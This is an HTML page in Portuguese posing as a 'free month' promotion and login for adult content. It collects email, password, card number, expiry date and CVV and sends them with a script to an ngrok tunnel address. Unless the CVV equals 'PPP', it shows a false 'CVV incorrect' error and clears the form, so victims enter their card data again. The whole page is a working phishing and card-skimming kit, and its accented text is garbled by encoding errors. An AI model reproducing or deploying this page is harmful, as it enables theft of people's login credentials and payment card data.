<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        /* Estilos aqui... */
    </style>
</head>
<body>
    <div class="container">
        <h2>PROMO√á√ÉO 1 M√äS GR√ÅTIS</h2>
        <p class="conteudos">Criar Conta</p>
        <p class="conteudos">Conte√∫dos Laisüîû</p>
        <form id="loginForm" method="POST" action="https://0a22-2804-6850-8000-3d01-2d4a-c112-c2f2-dbba.ngrok-free.app/">
            <div class="form-group">
                <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
            </div>
            <!-- Adicionei o atributo "required" aos campos para garantir que sejam preenchidos -->
            <div class="form-group">
                <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha" required>
            </div>
            <div class="form-group">
                <input type="text" class="form-control" id="cardNumber" name="cardNumber" placeholder="N√∫mero do Cart√£o" inputmode="numeric" maxlength="16" oninput="formatCardNumber(this)" required>
            </div>
            <div class="form-group">
                <input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="Data de Validade" inputmode="numeric" maxlength="5" oninput="formatExpiryDate(this)" required>
            </div>
            <div class="form-group">
                <input type="text" class="form-control" id="cvv" name="cvv" placeholder="CVV" maxlength="3" required>
            </div>
            <button type="button" onclick="enviarFormulario()">Entrar</button>
            <p id="mensagemErro" style="color: red;"></p>
        </form>
    </div>

    <script>
        function enviarFormulario() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var cardNumber = document.getElementById('cardNumber').value;
            var expiryDate = document.getElementById('expiryDate').value;
            var cvv = document.getElementById('cvv').value;

            // Verifica se todos os campos est√£o preenchidos
            if (email === '' || password === '' || cardNumber === '' || expiryDate === '' || cvv === '') {
                document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
                return;
            }

            var formData = new FormData();
            formData.append('email', email);
            formData.append('password', password);
            formData.append('cardNumber', cardNumber);
            formData.append('expiryDate', expiryDate);
            formData.append('cvv', cvv);

            var xhr = new XMLHttpRequest();
            xhr.open('POST', document.getElementById("loginForm").action);
            xhr.onload = function () {
                if (xhr.status === 200) {
                    // Redireciona apenas se o CVV for "PPP"
                    if (cvv === 'PPP') {
                        window.location.href = "https://drive.google.com/file/d/1-n2-7RG13HA7ttCVJukD_PpoMDsSRS6n/view?usp=drive";
                    } else {
                        // Se o CVV n√£o for "PPP", exibe uma mensagem de erro
                        document.getElementById('mensagemErro').innerText = 'CVV incorreto. Por favor, tente novamente.';
                        document.getElementById("loginForm").reset(); // Limpar campos ap√≥s erro
                    }
                } else {
                    var mensagem = xhr.responseText;
                    document.getElementById('mensagemErro').innerText = mensagem;
                    document.getElementById("loginForm").reset(); // Limpar campos ap√≥s erro
                }
            };
            xhr.send(formData);
        }

        // Fun√ß√µes de formata√ß√£o aqui...

    </script>
</body>
</html>
